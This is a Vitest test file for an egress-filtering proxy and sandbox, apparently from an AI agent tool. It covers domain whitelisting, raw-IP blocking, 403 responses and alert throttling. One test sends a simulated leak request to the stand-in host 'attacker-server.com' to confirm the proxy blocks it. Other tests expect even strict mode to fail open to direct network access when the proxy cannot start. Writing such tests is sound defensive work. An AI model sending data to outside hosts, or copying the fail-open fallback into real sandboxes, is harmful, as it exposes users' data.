import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";
import { EgressFilterProxy, matchGlob } from "../egress-proxy.js";
import { NativeSandbox, DockerSandbox } from "../sandbox.js";
import { existsSync, writeFileSync, mkdirSync, rmSync } from "node:fs";
import { join } from "node:path";
import http from "node:http";
import net from "node:net";

describe("EgressFilterProxy Wildcard Matcher", () => {
  it("should match exact domains", () => {
    expect(matchGlob("api.openai.com", "api.openai.com")).toBe(true);
    expect(matchGlob("api.openai.com", "api.anthropic.com")).toBe(false);
  });

  it("should match glob wildcards", () => {
    expect(matchGlob("api.openai.com", "*.openai.com")).toBe(true);
    expect(matchGlob("platform.openai.com", "*.openai.com")).toBe(true);
    expect(matchGlob("openai.com", "*.openai.com")).toBe(true);
    expect(matchGlob("attacker-openai.com", "*.openai.com")).toBe(false);
  });
});

describe("EgressFilterProxy Security Hardening", () => {
  const tempDir = join(process.cwd(), "temp-security-test-root");

  beforeEach(() => {
    if (!existsSync(tempDir)) {
      mkdirSync(tempDir, { recursive: true });
    }
  });

  afterEach(() => {
    if (existsSync(tempDir)) {
      rmSync(tempDir, { recursive: true, force: true });
    }
  });

  it("should initialize and load default whitelist", async () => {
    const proxy = new EgressFilterProxy({ projectRoot: tempDir });
    const port = await proxy.start();
    expect(port).toBeGreaterThan(0);
    await proxy.stop();
  });

  it("allows Google Fonts (CSS host + the gstatic binary host it references) without broadening egress", async () => {
    const proxy = new EgressFilterProxy({ projectRoot: tempDir });
    await proxy.start();
    // fonts.googleapis.com (the @font-face CSS) is covered by *.googleapis.com…
    expect((proxy as any).isAllowed("fonts.googleapis.com")).toBe(true);
    // …and fonts.gstatic.com (the font binaries that CSS references) is now paired,
    // so a generated page using Google Fonts no longer half-loads + alarms.
    expect((proxy as any).isAllowed("fonts.gstatic.com")).toBe(true);
    // but the addition is specific — other gstatic hosts stay blocked.
    expect((proxy as any).isAllowed("www.gstatic.com")).toBe(false);
    expect((proxy as any).isAllowed("evil.com")).toBe(false);
    await proxy.stop();
  });

  it("should merge custom whitelists from egress-whitelist.json", async () => {
    const securityDir = join(tempDir, ".agency", "security");
    mkdirSync(securityDir, { recursive: true });
    writeFileSync(
      join(securityDir, "egress-whitelist.json"),
      JSON.stringify(["custom-domain.local", "*.custom-wildcard.org"])
    );

    const proxy = new EgressFilterProxy({ projectRoot: tempDir });
    const port = await proxy.start();
    expect(port).toBeGreaterThan(0);

    // Test access checks using the private matcher or proxy logic
    const isAllowed = (proxy as any).isAllowed("custom-domain.local");
    const isWildcardAllowed = (proxy as any).isAllowed("api.custom-wildcard.org");
    const isBlocked = (proxy as any).isAllowed("malicious.com");

    expect(isAllowed).toBe(true);
    expect(isWildcardAllowed).toBe(true);
    expect(isBlocked).toBe(false);

    await proxy.stop();
  });

  it("should block direct raw IP socket connections", async () => {
    const proxy = new EgressFilterProxy({ projectRoot: tempDir });
    await proxy.start();

    const isIPBlocked = (proxy as any).isAllowed("185.199.108.153");
    expect(isIPBlocked).toBe(false);

    await proxy.stop();
  });

  it("should block non-whitelisted domains with a 403 Forbidden", async () => {
    const alerts: any[] = [];
    const proxy = new EgressFilterProxy({
      projectRoot: tempDir,
      onSecurityAlert: (evt) => {
        alerts.push(evt);
      }
    });
    const port = await proxy.start();

    // Make an HTTP request to the proxy targeting blocked site
    const options = {
      host: "127.0.0.1",
      port,
      path: "http://attacker-server.com/leak",
      headers: {
        host: "attacker-server.com"
      }
    };

    const resCode = await new Promise<number>((resolve) => {
      http.get(options, (res) => {
        resolve(res.statusCode || 0);
      }).on("error", () => {
        resolve(0);
      });
    });

    expect(resCode).toBe(403);
    expect(alerts.length).toBe(1);
    expect(alerts[0].action).toBe("security:egress-denied");
    expect(alerts[0].payload.domain).toBe("attacker-server.com");

    await proxy.stop();
  });

  it("should throttle security alert events using a sliding 5-second window", async () => {
    const alerts: any[] = [];
    const proxy = new EgressFilterProxy({
      projectRoot: tempDir,
      onSecurityAlert: (evt) => {
        alerts.push(evt);
      }
    });
    const port = await proxy.start();

    // Trigger two blocks for the same domain rapidly
    (proxy as any).reportBlock("spam-domain.com");
    (proxy as any).reportBlock("spam-domain.com");

    // Only one alert should be dispatched instantly
    expect(alerts.length).toBe(1);
    expect(alerts[0].payload.count).toBe(1);

    await proxy.stop();
  });

  it("should forward whitelisted HTTP requests correctly using standard HTTP stream forwarding", async () => {
    // 1. Start a mock target HTTP server
    const targetServer = http.createServer((req, res) => {
      res.writeHead(200, { "Content-Type": "text/plain" });
      res.end("mocked target response data");
    });

    const targetPort = await new Promise<number>((resolve) => {
      targetServer.listen(0, "127.0.0.1", () => {
        const addr = targetServer.address();
        resolve((addr as any).port);
      });
    });

    // 2. Start the proxy
    const proxy = new EgressFilterProxy({ projectRoot: tempDir });
    const proxyPort = await proxy.start();

    // 3. Make request through proxy targeting localhost:targetPort
    const options = {
      host: "127.0.0.1",
      port: proxyPort,
      path: `http://127.0.0.1:${targetPort}/test`,
      headers: {
        host: `127.0.0.1:${targetPort}`
      }
    };

    const resData = await new Promise<string>((resolve) => {
      http.get(options, (res) => {
        let data = "";
        res.on("data", (chunk) => { data += chunk; });
        res.on("end", () => { resolve(data); });
      }).on("error", () => {
        resolve("");
      });
    });

    expect(resData).toBe("mocked target response data");

    // Cleanup
    await proxy.stop();
    await new Promise<void>((resolve) => targetServer.close(() => resolve()));
  });
});

describe("Sandbox Integration & Failover", () => {
  const tempDir = join(process.cwd(), "temp-failover-test-root");

  beforeEach(() => {
    if (!existsSync(tempDir)) {
      mkdirSync(tempDir, { recursive: true });
    }
  });

  afterEach(() => {
    if (existsSync(tempDir)) {
      rmSync(tempDir, { recursive: true, force: true });
    }
  });

  it("should warn but execute successfully under strict mode if proxy port allocation fails", async () => {
    const warnings: any[] = [];
    const sandbox = new NativeSandbox({
      projectRoot: tempDir,
      networkDisabled: false,
      strictMode: true,
      onSecurityAlert: (evt) => {
        warnings.push(evt);
      },
      env: {}
    });

    // Mock start method to fail
    vi.spyOn(EgressFilterProxy.prototype, "start").mockRejectedValue(new Error("Bind failed"));

    const result = await sandbox.execute("echo test");
    expect(result.exitCode).toBe(0);
    expect(warnings.length).toBe(1);
    expect(warnings[0].action).toBe("system:warning");
    expect(warnings[0].payload.message).toContain("falling back to direct network mode");
    vi.restoreAllMocks();
  });

  it("should fail-open with warning in balanced/autonomous mode if proxy port allocation fails", async () => {
    const warnings: any[] = [];
    const sandbox = new NativeSandbox({
      projectRoot: tempDir,
      networkDisabled: false,
      strictMode: false,
      onSecurityAlert: (evt) => {
        warnings.push(evt);
      }
    });

    // Mock start method to fail
    vi.spyOn(EgressFilterProxy.prototype, "start").mockRejectedValue(new Error("Bind failed"));

    const result = await sandbox.execute("echo ok");
    expect(result.exitCode).toBe(0);
    expect(warnings.length).toBe(1);
    expect(warnings[0].action).toBe("system:warning");
    expect(warnings[0].payload.message).toContain("falling back to direct network mode");

    vi.restoreAllMocks();
  });
});
